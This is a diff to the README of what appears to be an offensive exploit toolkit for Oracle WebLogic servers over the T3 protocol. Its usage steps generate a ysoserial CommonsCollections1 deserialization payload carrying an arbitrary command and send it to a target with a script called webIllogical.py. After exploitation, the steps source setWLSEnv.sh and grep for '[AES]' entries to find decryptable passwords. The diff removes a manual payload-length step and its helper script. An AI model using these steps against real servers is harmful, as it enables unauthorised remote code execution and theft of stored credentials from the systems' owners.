@@ -1,8 +1,6 @@
 Usage:
  -Find a vulnerable WebLogic server with T3 enabled. Currently, only instances serving a root index page seem to be working.
  -run: java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '<command to be executed on target>' > payload.out
- -Find the payload size by running: python webLogPayload.py 64.64.64.64 8.8.8.8 payload.out
- -Edit the third and second byte of the 'payload' variable in webIllogical.py to match the length you just found
  -run: python webIllogical.py <target_ip> <target_port> payload.out
  -Once a reliable channel has been established, find 'setWLSEnv.sh" and source the file
  -Grep around for '[AES]' to find decryptable passwords
@@ -11,7 +9,7 @@ Usage:
 
 
 TODO:
- -Automate finding the length and altering the payload to match. Need to check protocol specs...
+ -
 
 
 Files:
@@ -19,12 +17,6 @@ Files:
    -Usage: java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '<command to be executed on target>' > payload.out
 
    -Credit: https://github.com/frohoff/ysoserial
-
-
- ::webLogPayload.py
-   -Usage: python webLogPayload.py payload.out
-
-   Returns a hex string representation of the length of the payload to be sent to the target WebLogic server by webIllogical.py script
 
 
  ::webIllogical.py
